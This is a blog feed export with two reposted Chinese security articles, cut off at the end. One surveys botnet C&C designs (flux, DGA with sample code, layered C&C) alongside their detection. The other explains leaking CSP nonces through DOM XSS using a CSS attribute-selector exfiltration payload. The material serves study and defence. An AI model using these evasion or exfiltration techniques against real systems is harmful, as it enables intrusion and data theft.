AWS之类的云服务器上，通知了服务提供商很容易封禁IP。国内的云服务商态度暧昧，不过也算还行吧。有机智的国内malware作者在东南亚地区租用云服务IP，可以有效避开国内监管而且速度不错(我并不是教你这么做啊)。</p><p>安全人员也不要以为这个方法低级就以为能轻易有效防御，比如说如果感染机不能安装防毒软件或者根本你就不知道中毒了。最近的一个例子是最近比较火的植入路由器的Linux/Xor.DDOS，它的C&amp;C控制就是在AWS上面的IP，造成的影响很大，因为多数人并不知道路由器会被大规模植入恶意软件，路由器本身也很少有防护，正好适合用IP做C&amp;C，还省去了复杂的域名算法和DNS查询的代码保证了软件本身的轻量化。也由于路由本身常开的特性，路由木马也不用担心失去链接，一次C&amp;C的通讯可以保持连接很久，降低了木马被发现的机会。技巧虽然不华丽，但是用的好还是威力强大。该木马的详细分析参见<a href="http://blog.malwaremustdie.org/2015/09/mmd-0042-2015-polymorphic-in-elf.html" target="_blank" rel="noopener">http://blog.malwaremustdie.org/2015/09/mmd-0042-2015-polymorphic-in-elf.html</a> 。</p><h2 id="0X02-单一C-amp-C域名：难度较低，易被抓"><a href="#0X02-单一C-amp-C域名：难度较低，易被抓" class="headerlink" title="0X02 单一C&amp;C域名：难度较低，易被抓"></a><strong>0X02 单一C&amp;C域名：难度较低，易被抓</strong></h2><p>因为硬编码的IP容易通过在二进制码内的字串段批量regex扫描抓到，<strong>一个变通的办法就是申请一些域名，比如idontthinkyoucanreadthisdomain.biz代替IP本身，扫描二进制码就不会立刻找到IP字段</strong>。这是个很广泛使用的方法，通常C&amp;C域名会名字很长，伪装成一些个人主页或者合法生意，甚至还有个假的首页。即使这么用心，这种方法还是治标不治本，侦测的方法也相对简单，原因是：</p><p>安全厂商比如Sophos等的资深安全人员经验丰富，他们会很快人工<strong>定位到恶意软件可能包含C&amp;C域名的函数，并且通过监测蜜罐的DNS查询数据，很快定位到C&amp;C域名</strong>。这些定位的域名会被上报给其他厂商比如运营商或者VirusTotal的黑名单。</p><p>新的C&amp;C域名会在DNS数据的异常检测里面形成一些特定的模式，通过数据做威胁感知的厂商很容易侦测到这些新出现的奇怪域名，并且通过IP和其他网络特征判定这是可疑C&amp;C域名。</p><p>所以常见的C&amp;C域名都在和安全厂商的黑名单比速度，如果比安全研究员反向工程快，它就赢了，但是最近的格局是随着基于数据的威胁感知越来越普遍，这些C&amp;C域名的生命周期越来越短，运气不好的通常活不过半个小时。攻击者也会设计更复杂的办法隐藏自己，因为注册域名需要一定费用，比如带隐私保护的.com域名需要好几十美元，寻找肉鸡植入木马也要费很大功夫，本来准备大干一场连攻半年结果半个小时就被封了得不偿失。</p><p>在这个速度的比赛里<strong>，一个低级但是省钱方便技巧就是用免费二级域名</strong>，比如3322家族啊vicp家族等不审查二级域名的免费二级域名提供商，最著名的例子就是Win32/Nitol家族，搞的微软靠法院判来3322.org的所有权把他们整个端了(虽然后来域名控制权又被要回去了)。这个方法是国内malware作者最喜欢的一个方法，数据里常见一些汉语拼音类的C&amp;C域名，比如woshinidie.3322.org等喜感又不忘占便宜的二级域名，可能因为在我国申请顶级域名麻烦还费钱容易暴露身份，不如闷声发大财。你看，这也不是我在教你这么做啊。</p><p>真正有意思的是技术是，比较高级的C&amp;C域名都不止一个，通过一个叫做fast flux的办法隐藏自己。</p><h2 id="0X03-Fast-flux-double-flux-and-triple-flux"><a href="#0X03-Fast-flux-double-flux-and-triple-flux" class="headerlink" title="0X03 Fast flux, double flux and triple flux"></a><strong>0X03 Fast flux, double flux and triple flux</strong></h2><p>攻击者对付传统蜜罐和二进制分析的办法就是不要依靠单一C&amp;C，取而代之的是快速转换的C&amp;C域名列表(fast flux技术)：<strong>攻击者控制几个到几十个C&amp;C域名，这些域名都指向同一个IP地址</strong>，域名对应IP的DNS record每几个小时或者几天换一次，然后把这些C&amp;C域名分散的写到malware的代码里面。对于传统二进制分析来说，挂一漏万，<strong>如果不能把整个C&amp;C域名列表里面的所有域名放到黑名单上，就不能有效的摧毁这个恶意软件</strong>。这就比赛攻击者的隐藏代码能力和防御者的反向工程以及蜜罐监测能力了。这种方法叫做Fast flux，专门设计用来对付安全人员的人工分析。</p><p>防御Fast flux的方法在流量数据里看相对容易，比如威胁感知系统只需要简单的把每个域名解析指向的IP的历史数据<strong>按照IP做一次group by就抓住了，</strong>利用数据并不难嘛。所以应运而生有更高级double flux和triple flux的办法。</p><p>如果攻击者比较有钱，租用了多个IP地址，<strong>那么他可以在轮换C&amp;C域名的同时轮换IP地址</strong>，这样M个C&amp;C域名和N个IP地址可以有M*N种组合，如果设计的轮换时间稍微分散一些，会让蜜罐流量分析缺乏足够的数据支持。侦测double flux的办法需要一些简单的图知识（请系好安全带在家长陪同下观看）：</p><p>如果把每个域名和IP地址当做图的节点V，一个有效的域名-IP记录当做对应两个节点的边E，那么整个流量数据就可以表示为一个由V_域名指向V_IP的二分有向图。Double <strong>flux的图就是这个巨大二分有向图里的互相为满射的完全二分图</strong>，换句人话就是，存在这样一个子图，当中每个V_域名节点都指向同样一个集合的V_IP节点，而每个V_IP节点都被同一个集合的V_域名节点指向。图示如下</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/C&amp;C%E6%8E%A7%E5%88%B6%E6%9C%8D%E5%8A%A11.jpg" alt="此处输入图片的描述"></p><p>当然了，感染的IP可以访问别的域名，比如图中google.com。在实际情况里，由于数据采集时间的限制，每个IP节点都要访问所有C&amp;C域名这个条件可以放宽。</p><p>当攻击者得知安全人员居然可以用图论的方法干掉他们的double flux这么高级的设计方法之后，更疯狂的triple flux出现了：每个域名的记录里不仅可以添加A record也就是IP的指向，还可以选定不同的命名服务器Name server来解析这个域名，如果攻击者足够有钱（以及有时间精力），他可以控制K个name server定时或者不定时轮换，这样可以造成M*N*K种组合。</p><p>Triple flux方法看似机智，好像跑得比谁都快，其实在实现上聪明反被聪明误，漏洞就在name server的设置上：多数正常服务的name server都是专有服务，而多数C&amp;C多架设在免费name server比如DNSpod的免费服务器上。如果攻击者能够控制自己的一系列name server专门作fast flux，这些server并不是常见的name server。任何非常见的服务器域名都会在流量数据的异常检测里面被监测出来，上一节里面提到异常检测侦测C&amp;C域名的方法对triple flux里面的name server也是可用的。你看，攻击者Naive了吧。</p><p>对于fast flux这一类特定flux类方法的监测还有另外一个基于数据和机器学习的方法：如果仔细思考一下fast flux，我们也会发现攻击者试图创造一个聪明的办法，但这种办法本身有一个致命缺陷，也就是追求fast，它的域名对IP的记录转换太快了，导致每个域名纪录的存活时间TTL被迫设计的很短，而绝大多数的正常服务并不会有如此快速的域名对应IP的记录转换，大型网站的负载均衡和CDN服务的IP纪录转换和fast flux有截然不同的特征。这些特征可以很容易被机器学习算法利用判别fast flux的僵尸网络，相关研究可以参看比如<a href="https://www.syssec.rub.de/media/emma/veroeffentlichungen/2012/08/07/Fastflux-Malware08.pdf等较早研究fast" target="_blank" rel="noopener">https://www.syssec.rub.de/media/emma/veroeffentlichungen/2012/08/07/Fastflux-Malware08.pdf等较早研究fast</a> flux的论文。</p><h2 id="0X04-使用随机DGA算法：难度较高，不易被抓"><a href="#0X04-使用随机DGA算法：难度较高，不易被抓" class="headerlink" title="0X04 使用随机DGA算法：难度较高，不易被抓"></a><strong>0X04 使用随机DGA算法：难度较高，不易被抓</strong></h2><p><strong>DGA域名生成算法 (Domain Generation Algorithm) 是现在高级C&amp;C方法的主流</strong>，多见于国外各大活跃的恶意软件里，在VirusTotal里如果见到看似随机的C&amp;C域名都算这一类。<strong>它的基本设计思想是，绝不把域名字符串放到malware代码里，</strong>而是写入一个确定随机算法计算出来按照一个约定的随机数种子计算出一系列候选域名。攻击者通过同样的算法和约定的种子算出来同样列表，并注册其中的一个到多个域名。这样malware并不需要在代码里写入任何字符串，而只是要遵守这个约定就好。这个方法厉害在于，这个随机数种子的约定可以不通过通讯完成，比如当天的日期，比如当天twitter头条等。这种方法在密码学里称之为puzzle challenge，也就是控制端和被控端约好一个数学题，有很多答案，控制端选一个，被控端都给算出来，总有一个答上了。</p><p>一个简单的例子（引用自wikipedia）比如说这段代码可以用今天2015年11月3日当做种子生成cqaqofiwtfrbjegt这个随机字符串当做今天的备选C&amp;C域名：</p><pre><code>def generate_domain(year, month, day):&quot;&quot;&quot;Generates a domain name for the given date.&quot;&quot;&quot;domain = &quot;&quot;    for i in range(16):        year = ((year ^ 8 * year) &gt;&gt; 11) ^ ((year &amp; 0xFFFFFFF0) &lt;&lt; 17)        month = ((month ^ 4 * month) &gt;&gt; 25) ^ 16 * (month &amp; 0xFFFFFFF8)        day = ((day ^ (day &lt;&lt; 13)) &gt;&gt; 19) ^ ((day &amp; 0xFFFFFFFE) &lt;&lt; 12)        domain += chr(((year ^ month ^ day) % 25) + 97)    return domain</code></pre><p>DGA方法的代表做就是Conficker，它的分析论文可以在这里找到：<a href="http://www.honeynet.org/papers/conficker" target="_blank" rel="noopener">http://www.honeynet.org/papers/conficker</a> <strong>它的基本思想是用每天的日期当做随机数种子生成几百到几千不等的伪随机字符串，然后在可选的域名后缀比如.com .cn .ws里面挑选后缀生成候选的C&amp;C域名，攻击者用同样算法和种子得到同样的列表，然后选择一个注册作为有效的C&amp;C</strong>。安全人员即使抓到了二进制代码，在汇编语言里面反向出来这个随机数生成算法也远比搜索字符串难的多，所以DGA是个有效防止人工破解的方法。最近几年使用DGA算法的恶意软件里，Conficker的方法是被研究人员反向工程成功，Zeus是因为源码泄漏，其他的解出来DGA算法的案例并不多。</p><p>如果一个DGA算法被破解，安全人员可以用sinkhole的办法抢在攻击者之前把可能的域名都抢注并指向一个无效的IP。这种方法虽然有安全公司在做，但费时费力，是个绝对雷锋的做法，因为注册域名要钱啊，每天备选的域名又很多，都给注册了很贵的。现在常见的Torpig之类的C&amp;C域名被sinkhole。更便宜有效的另外一个方法就是和DNS厂商合作，比如Nominum的Vantio服务器上TheatAvert服务可以实时推送DGA名单并禁止这些域名解析，使用了ThreatAvert的服务商就不会解析这些C&amp;C域名，从而阻断了恶意软件和C&amp;C域名的通讯。</p><p>从数据分析上可以看到DGA的另一个致命缺点就在于生成了很多备选域名。攻击者为了更快速的发起攻击，比如攻击者的客户要求付钱之后半小时内发起DDoS攻击，那么C&amp;C的查询频率至少是每半小时，这就导致botnet对于C&amp;C的查询过于频繁。虽然DGA本身看起来像是隐藏在众多其他合法流量里，但是现在已经有很多有针对DGA的各个特性算法研究，比如鄙人的<a href="http://www.anquan.us/static/drops/tips-6220.html" target="_blank" rel="noopener">用机器学习识别随机生成的C&amp;C域名</a>里面利用到了DGA的随机性等其它特性进行判别，安全研究人员可以用类似算法筛选疑似DGA然后根据频繁访问这些DGA域名的IP地址等其他特征通过图论或其他统计方法判别C&amp;C服务和感染的IP等。</p><h2 id="0X05-高级变形DGA：如果DGA看起来不随机"><a href="#0X05-高级变形DGA：如果DGA看起来不随机" class="headerlink" title="0X05 高级变形DGA：如果DGA看起来不随机"></a><strong>0X05 高级变形DGA：如果DGA看起来不随机</strong></h2><p>基于DGA侦测的多数办法利用DGA的随机性，所以现在高级的DGA一般都用字典组合，比如ObamaPresident123.info等等看起来远不如cqaqofiwtfrbjegt.info可疑，攻击者利用这种方法对付威胁感知和机器学习方法的侦测。最近的一个例子出现在Cisco的<a href="https://blogs.cisco.com/security/talos/detecting-dga" target="_blank" rel="noopener">一篇blog</a>里面提到的DGA就是一个很小的硬编码在代码里字典文件，通过单词的组合生成C&amp;C域名。这些字典组合的DGA看起来并不随机，多数论文和blog里针对随机DGA机器学习的办法就不管用了。</p><p>对于这种DGA暂时并没有成熟有效的侦测方法，因为字典是未知的，可以是英语词汇，可以是人名，可以是任何语言里的单词。常用的方法还是基于随机DGA里面用到过的n-gram方法，比如用已知的DGA的n-gram分布判断未知DGA，同时结合其它的特征比如解析的IP等等，或者利用DGA频繁查询的特性用n-gram特征作聚类。相关论文可以自行使用“Algorithmically Generated Domains”等关键词搜索</p><h2 id="0X06-多层混合C-amp-C，跟着我左手右手一个慢动作：难度最高，不易被抓"><a href="#0X06-多层混合C-amp-C，跟着我左手右手一个慢动作：难度最高，不易被抓" class="headerlink" title="0X06 多层混合C&amp;C，跟着我左手右手一个慢动作：难度最高，不易被抓"></a><strong>0X06 多层混合C&amp;C，跟着我左手右手一个慢动作：难度最高，不易被抓</strong></h2><p>在DGA部分提到了，DGA的致命缺点在于被动查询，如果想要快速启动攻击就必须让malware频繁查询C&amp;C，导致C&amp;C查询数据上异常于正常的查询流量。多层混合C&amp;C可以有效避免这个问题，是个丢卒保帅的战术。这种方法在亚洲区的malware里面见到过很少几次。</p><p><strong>比如攻击者设计一个两层的C&amp;C网络，Boss级的C&amp;C使用主域名列表比如.com域名，Soldier杂兵级C&amp;C用免费二级域名列表比如woshinidaye.3322.org，malware每天查询一次Boss级C&amp;C拉取当天杂兵C&amp;C域名列表，然后以一分钟一次的频率查询杂兵C&amp;C域名，接受攻击指令</strong>，示意图如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/C&amp;C%E6%8E%A7%E5%88%B6%E6%9C%8D%E5%8A%A12.jpg" alt="此处输入图片的描述"></p><p><strong>侦测和封禁这类高级混合C&amp;C难点在于：</strong></p><ul><li><p>在数据里，Boss级的C&amp;C出现几率很低，可以不定时也可以一周一次，如果用一些早就注册过的域名或者通过黑进他人服务器利用无辜域名，Boss级的C&amp;C很容易逃过异常检测。</p></li><li><p>数据里可以检测到的是频繁查询的低级的杂兵C&amp;C域名。如果把这些域名封禁，malware在下一轮更新杂兵C&amp;C列表后会使这种封禁方法无效。杂兵域名就是主动跑上来送死的，反正二级域名不要钱。</p></li><li><p>更高级的做法是，如果Boss级的C&amp;C列表里的域名用完了，它可以通过这个两层网络实时推送新的Boss级C&amp;C列表。你看人家都不需要DGA这么麻烦。<br>侦测和防御方法需要一些数据和图论的知识，具体参考侦测double flux的模型，同样是两层网络，不同点在于两层节点都是域名节点，留作课后作业，这里就不赘述了。针对实现上另一个特征是，杂兵域名主要目的是来送死，他们的价格往往不高，比如免费二级域名或者免费的ccTLD或者gTLD后缀，利用这个特征可以把第二层网络的尺度缩小，从而在图数据库的计算速度上有不小的提升。</p></li></ul><h2 id="0X07-利用Twitter-Reddit等论坛：难度低，被抓看运气"><a href="#0X07-利用Twitter-Reddit等论坛：难度低，被抓看运气" class="headerlink" title="0X07 利用Twitter Reddit等论坛：难度低，被抓看运气"></a><strong>0X07 利用Twitter Reddit等论坛：难度低，被抓看运气</strong></h2><p>前面提到的办法多是攻击者自己架设服务器，如果攻击者的C&amp;C域名被发现封禁了，这个botnet就被摧毁了。机智的攻击者就想到了通过论坛发帖的办法，<strong>比如在Twitter发一条在特定冷门话题下的包含C&amp;C指令的tweet或者reddit上面找个十分冷门的subreddit发个包含控制指令的贴，这样即使被运营商或者安全研究小组发现了，人家总不能把推特和reddit封了吧</strong>（我说的是美国政府没有这个权利）。去年被抓住的名为<a href="https://vms.drweb.com/virus/?i=4161206" target="_blank" rel="noopener">Mac.BackDoor.iWorm</a>的恶意软件就是利用reddit做C&amp;C控制服务器，具体细节请参考<a href="http://news.drweb.com/show/?i=5976&amp;lng=en&amp;c=1" target="_blank" rel="noopener">http://news.drweb.com/show/?i=5976&amp;lng=en&amp;c=1</a> 也有把C&amp;C信息隐藏在一篇看起来很正常的文章里面防止被发现，比如MIT的这个把加密消息隐藏在一篇论文里的有趣的demo <a href="https://pdos.csail.mit.edu/archive/scigen/scipher.html" target="_blank" rel="noopener">https://pdos.csail.mit.edu/archive/scigen/scipher.html</a> 不过在实际工作里暂时还没有看到这么高科技的C&amp;C做法（你看我也不是教你这么做啊）。</p><p>这种方法不适合国内的大环境，因为国外论坛发帖是不举报不删帖很容易闷声发大财，但是水能载舟，亦可赛艇，国内由于发帖的身份控制严格，如果用这个方法很可能被眼尖的版主发现汇报给警察叔叔。而且新浪微博发C&amp;C控制微博也不现实，微博为了防爬虫要强制登陆而且微博那个API的麻烦程度你也是知道的。所以这个方法只是拓展视野，顺便写个段子。</p><p>这里必须要插入一个段子了。一个真实的故事就是，我们抓到了一个做DDoS攻击的botnet，我们的模型告诉我这些攻击流量和twitter.com的访问流量有强相关，经过细致研究发现，这个bot可能用twitter的关键词当随机数种子生成攻击DGA域名。但奇怪的是，同一个bot感染的IP列表里面，中国区IP的随机数种子似乎有初始化的问题，每次的种子都是一样的。我们机智的抓住了这一点，把中国区当做对比组反向出了DGA算法：因为一个特殊的原因中国区感染IP不能访问twitter，如果认为中国区的DGA种子总是空字符串，我们对比中国区的DGA和其他地区的DGA差不多可以猜出来它的DGA的方法，从而反向工程出来它们的DGA算法。这里需要感谢一下国家。</p><h2 id="0X08-一些其它的高级技术"><a href="#0X08-一些其它的高级技术" class="headerlink" title="0X08 一些其它的高级技术"></a><strong>0X08 一些其它的高级技术</strong></h2><p>限于篇幅限制有一些现阶段不太常用的C&amp;C技术在这里仅仅简单描述一下，有兴趣的观众朋友们可以自行搜索。</p><h3 id="1-利用P2P网络的C-amp-C。"><a href="#1-利用P2P网络的C-amp-C。" class="headerlink" title="1.利用P2P网络的C&amp;C。"></a><strong>1.利用P2P网络的C&amp;C。</strong></h3><p>如果一个僵尸网络里面所有的感染IP互相成为对方的C&amp;C控制服务器，看起来很难摧毁所有的C&amp;C。侦测重点在这个网络初始化的时候，就好比其它的BT下载必须从一个种子或者磁力链开始，当感染IP访<br>问初始化C&amp;C的时候，它还是需要用上面说到的C&amp;C方法，只是频率很低。</p><h3 id="2-IRC通讯"><a href="#2-IRC通讯" class="headerlink" title="2.IRC通讯."></a><strong>2.IRC通讯.</strong></h3><p>这是一个传统历史悠久的C&amp;C控制方法。因为现在日常生活里IRC已经被一些即时消息服务比如微信等等取代，很少有普通群众会用到IRC，年轻的安全人员可能会忽视IRC这个老办法。办法虽老，但是用处广泛，好比T－800机器人，”Old, but not obsolete.”</p><h3 id="3-你知道还可以手动C-amp-C么？"><a href="#3-你知道还可以手动C-amp-C么？" class="headerlink" title="3.你知道还可以手动C&amp;C么？"></a><strong>3.你知道还可以手动C&amp;C么？</strong></h3><p>我就见过在乡镇政府内网留了Windows Server 2003后门手工进去挨个启动的，毫无PS痕迹，嗯。</p><h2 id="0X09-结语"><a href="#0X09-结语" class="headerlink" title="0X09 结语"></a><strong>0X09 结语</strong></h2><p>说了这么多，主要目的是想介绍一下国际先进的恶意软件C&amp;C设计和侦测经验，我们国内的malware不能总纠结于易语言啊VC6.0啊之类的我国特色，也需要向国际靠拢。同样的，我国的安全研究人员也需要国际先进经验，走在攻击者前面。</p><p>C&amp;C的设计和防御一直都是猫鼠游戏，不定期会出现一些大家都没想到的很机智的办法。在侦测C&amp;C服务的过程里，数据科学和机器学习是很重要的工具，C&amp;C的侦测现在越来越多的用到数据方法，在文中大家也看到了，攻击者已经设计出来一些对抗数据分析和机器学习的更高级C&amp;C设计方法，足以看出数据科学在安全领域的重要作用，连攻击者都体会到了。很多C&amp;C服务看似随机，分布也广泛，但是在统计分析上会显示出一些特定规律从而让安全人员发现。没有人可以骗的过统计规律，不是吗？</p><h2 id="0X10-文章来源"><a href="#0X10-文章来源" class="headerlink" title="0X10 文章来源"></a><strong>0X10 文章来源</strong></h2><p><a href="http://www.anquan.us/static/drops/tips-10232.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-10232.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇文章总结了一些我在安全工作里见到过的千奇百怪的C&amp;amp;C控制服务器的设计方法以及对应的侦测方法，在每个C&amp;amp;C控制服务先介绍黑帽部分即针对不同目的的C&amp;amp;C服务器设计方法，再介绍白帽部分即相关侦测办法，大家来感受一下西方的那一套。这里的白帽部分有一部分侦测方法需要一些数据和统计知识，我也顺便从原理上简单讨论了一下用数据进行安全分析的方法，从数学和数据原理上思考为什么这么做，可以当作数据科学在安全领域的一些例子学习一下。&lt;/p&gt;
&lt;h2 id=&quot;0x00-什么是C-amp-C服务器&quot;&gt;&lt;a href=&quot;#0x00-什么是C-amp-C服务器&quot; class=&quot;headerlink&quot; title=&quot;0x00 什么是C&amp;amp;C服务器&quot;&gt;&lt;/a&gt;&lt;strong&gt;0x00 什么是C&amp;amp;C服务器&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;C&amp;amp;C服务器(又称CNC服务器)也就是 Command &amp;amp; Control Server，&lt;strong&gt;一般是指挥控制僵尸网络botnet的主控服务器&lt;/strong&gt;，用来和僵尸网络的每个感染了恶意软件(malware)的宿主机进行通讯并&lt;strong&gt;指挥它们的攻击行为&lt;/strong&gt;。每个malware的实例通过和它的C&amp;amp;C服务器通讯获得指令进行攻击活动，包括获取DDoS攻击开始的时间和目标，上传从宿主机偷窃的到的信息，定时给感染机文件加密勒索等。&lt;/p&gt;
    
    </summary>
    
      <category term="C&amp;C" scheme="https://www.k0rz3n.com/categories/C-C/"/>
    
    
      <category term="转载" scheme="https://www.k0rz3n.com/tags/%E8%BD%AC%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)</title>
    <link href="https://www.k0rz3n.com/2019/03/09/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20DOM%20XSS%20%E6%9D%A5%E7%BB%95%E8%BF%87%20CSP%20%E7%9A%84%20nonces%20%E6%9C%BA%E5%88%B6(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/"/>
    <id>https://www.k0rz3n.com/2019/03/09/如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)/</id>
    <published>2019-03-09T04:37:18.000Z</published>
    <updated>2019-04-28T14:10:39.281Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>CSP nonces 在对抗 DOM XSS 方面似乎并没有所谓的奇效。你可以通过几种方法绕过它们。我不知道如何修复，也许不应该修复。</p><blockquote><p>谢谢你的阅读。这篇博文讲述了CSP nonces 的绕过方法，从一些背景开始，接着介绍在几种情况下如何绕过CSP nonces，并以一些评论结束。和往常一样，这篇博文是我对这个主题的个人看法，我很想听听你的看法。</p></blockquote><h2 id="0X01-我与CSP的关系-”错综复杂”"><a href="#0X01-我与CSP的关系-”错综复杂”" class="headerlink" title="0X01 我与CSP的关系,”错综复杂”"></a><strong>0X01 我与CSP的关系,”错综复杂”</strong></h2><p>我以前喜欢Content-Security-Policy。大约在2009年，我曾经非常兴奋。我的兴奋程度很高，我甚至花了很多时间在我的ACS项目中用JavaScript实现CSP（据我所知，这是第一个正在运行的CSP实现/原型）。<strong>它支持哈希和白名单</strong>，我真的相信它会很棒！</p><p>但有一天，我的一位来自elhacker.net（WHK）的朋友指出<strong>，使用JSONP可以简单地规避ACS（以及扩展的CSP）</strong>。 他指出，<strong>如果你将包含JSONP端点的主机名列入白名单，那么安全机制就会被破坏</strong>，确实有很多这样的情况，以至于我没有看到解决这个问题的简单方法,我的心碎了</p><p>快进到2015年，Mario Heiderich做了一个很酷的XSS挑战，名为“<a href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22" target="_blank" rel="noopener">Sh*t，it’s CSP！</a>”，其中的挑战是以最短的有效载荷逃离一个看似安全的CSP。不出所料，JSONP出现了（但也是Angular和Flash）。</p><a id="more"></a><p>然后在2016年终于有一篇名为“CSP Is Dead，Long Live CSP！”的相当受欢迎的论文。在完成了由Miki，Lukas，Sebastian和Artur执行的CSP部署的互联网范围调查之后，WHK和Mario强调了问题。该论文的结论是CSP白名单完全被破坏和无用。我想，至少CSP参加了葬礼。</p><p>然而，并没有那么简单。作为贡献，该论文主张使用CSP nonces 而不是原始的基于白名单的策略，这是CSP新方式的美好未来！</p><p>当首次提出CSP nonces时，我对它们的关注是它们的权限传递似乎非常困难。为了解决这个问题，<strong>2012年的<a href="https://code.google.com/archive/p/dominatrixss-csp/" target="_blank" rel="noopener">dominatrixss-csp</a>使得所有动态生成的脚本节点都可以通过使用动态资源过滤器传递脚本的nonces来工作</strong>。这使得nonces 的传递非常简单。因此，本文提出了这种确切的方法，并命名为 strict-dynamic，现在支持用户代理，而不是像dominatrixss-csp那样的运行时脚本。很大的改进。我们得到了一个本地的dominatrixss！</p><p>这种新的CSP风格，<strong>建议完全忽略白名单，并完全依赖于nonces</strong>。虽然CSP nonces的部署比白名单更难（因为它需要在策略的每一页上进行服务器端更改），但它似乎提出了真正的安全性好处，这显然缺乏基于白名单的方法。再一次，今年秋天，我对这种新方法相当乐观。也许有一种方法可以让大多数XSS实际上真的不可触发。也许CSP毕竟不是假的！</p><p>但是这个圣诞节，如果它是来自圣诞老人的一块煤，塞巴斯蒂安莱基斯指出，在我看来，似乎是对CSP nonces的重大打击，几乎完全使CSP对2016年的许多XSS漏洞无效。</p><h2 id="0X02-一个-CSS-CSP-DOM-XSS-three-way"><a href="#0X02-一个-CSS-CSP-DOM-XSS-three-way" class="headerlink" title="0X02 一个 CSS + CSP + DOM XSS three-way"></a><strong>0X02 一个 CSS + CSP + DOM XSS <a href="https://en.oxforddictionaries.com/definition/three-way" target="_blank" rel="noopener">three-way</a></strong></h2><p>虽然CSP nonces确实看起来能够抵御15年前的XSS漏洞，<strong>但它们似乎对DOM XSS没那么有效</strong>。为了解释原因，我需要向您展示如今的Web应用程序是如何编写，以及它与2002年的不同之处。</p><p>以前，大多数应用程序逻辑都存在于服务器中，但在过去的十年中，它一直在向客户端移动。<strong>现在有一天，开发Web应用程序的最有效方法是在HTML + JavaScript中编写大部分UI代码</strong>。除了其他方面，<strong>这允许使Web应用程序脱机就绪，并提供对无限供应的强大Web API的访问。</strong></p><p>而现在，新开发的应用程序仍然具有XSS，不同之处在于，<strong>由于很多代码都是用JavaScript动态生成的</strong>，<strong>现在它们都有DOM XSS</strong>。而这些正是CSP nonces无法持续防御的错误类型（至少目前已实施）。</p><p><strong>让我举三个例子（当然是非详尽的列表）DOM XSS漏洞是常见的，单独的CSP nonces无法防御：</strong></p><p>(1)当攻击者可以强制定向到易受攻击的页面时并且有效 payload <strong>不包含在缓存的响应中（因此需要获取）</strong>时会出现<strong>存储型 DOM XSS:</strong>。</p><p>(2)在页面包含第三方HTML代码的地方，例如，</p><pre><code>fetch(location.pathName).then(r=&gt;r.text()).then(t=&gt;body.innerHTML=t);</code></pre><p>会出现 DOM XSS 漏洞</p><p>(3)XSS有效负载位于location.hash中,例如，</p><pre><code>https://victim/xss#!foo?payload=</code></pre><p>的地方会出现 DOM XSS 漏洞</p><p>为了解释原因，我们需要回到2008年（woooosh！）。早在2008年，Gareth Heyes，David Lindsay和我在Microsoft Bluehat上做了一个小小的演讲，名为<a href="https://docs.google.com/viewer?url=www.businessinfo.co.uk/labs/talk/The_Sexy_Assassin.ppt" target="_blank" rel="noopener">CSS-The Sexy Assassin</a>。除此之外，我们还展示了一种纯粹使用CSS3选择器读取HTML属性的技术（几个月之后，它被WiSec重新发现并在其25c3谈话 <a href="https://www.youtube.com/watch?v=RNt_e0WR1sc" target="_blank" rel="noopener">Attacking Rich Internet Applications</a> 与kuza55 一起呈现）。</p><p>这种攻击的总结是，可以创建一个CSS程序，逐个字符地展示HTML属性的值，只需每次CSS选择器匹配时生成HTTP请求，然后连续重复。如果您还没有看到这个工作，请看看这里。它的工作方式非常简单，它只是创建一个表单的CSS属性选择器：</p><pre><code>*[attribute^=&quot;a&quot;]{background:url(&quot;record?match=a&quot;)}*[attribute^=&quot;b&quot;]{background:url(&quot;record?match=b&quot;)}*[attribute^=&quot;c&quot;]{background:url(&quot;record?match=c&quot;)}[...]</code></pre><p>然后，一旦我们得到一个匹配，重复:</p><pre><code>*[attribute^=&quot;aa&quot;]{background:url(&quot;record?match=aa&quot;)}*[attribute^=&quot;ab&quot;]{background:url(&quot;record?match=ab&quot;)}*[attribute^=&quot;ac&quot;]{background:url(&quot;record?match=ac&quot;)}[...]</code></pre><p>直到它渗透完整的属性。<br>对脚本标记的攻击非常简单。我们需要进行完全相同的攻击，唯一需要注意的是确保脚本标记设置为display：block;</p><p>因此，<strong>我们现在可以使用CSS提取CSP随机数</strong>，我们唯一需要做的就是能够在同一个文档中多次注入。上面给出的DOM XSS的三个例子恰好就是这样。一种在同一文档中多次注入XSS有效 payload 的方法。完美的 three-way。</p><h2 id="0X03-概念验证"><a href="#0X03-概念验证" class="headerlink" title="0X03 概念验证"></a><strong>0X03 概念验证</strong></h2><p>首先，存储型的DOM XSS。这个问题尤其令人不安，因为如果在“新世界”中，开发人员应该用JavaScript编写UI，那么动态内容需要异步地来自服务器。</p><p>我的意思是，如果用HTML + JavaScript编写UI代码，那么用户数据必须来自服务器。虽然此设计模式允许您控制应用程序逐步加载的方式，但它也<strong>使得加载同一文档两次可以每次返回不同的数据</strong>。</p><p>当然，现在的问题是：<strong>如何强制文档加载两次！？当然，使用HTTP缓存！</strong>这正是塞巴斯蒂安今年圣诞节向我们展示的。</p><p><strong>Sebastian解释了CSP nonces 如何与大多数缓存机制不兼容，并提供了一个简单的概念证明来<a href="http://sebastian-lekies.de/csp/attacker.php" target="_blank" rel="noopener">证明它</a>。</strong></p><p>1.首先判断漏洞页面是否禁止了浏览器的缓存</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20DOM%20XSS%20%E6%9D%A5%E7%BB%95%E8%BF%87%20CSP%20%E7%9A%84%20nonces%20%E6%9C%BA%E5%88%B65.png" alt="此处输入图片的描述"></p><p>2.将触发 DOM XSS 的payload 构造好(点击可触发 DOM XSS 将 nonces 的值获取，通过表单发送到自己控制的另一个页面2)，然后通过 iframe 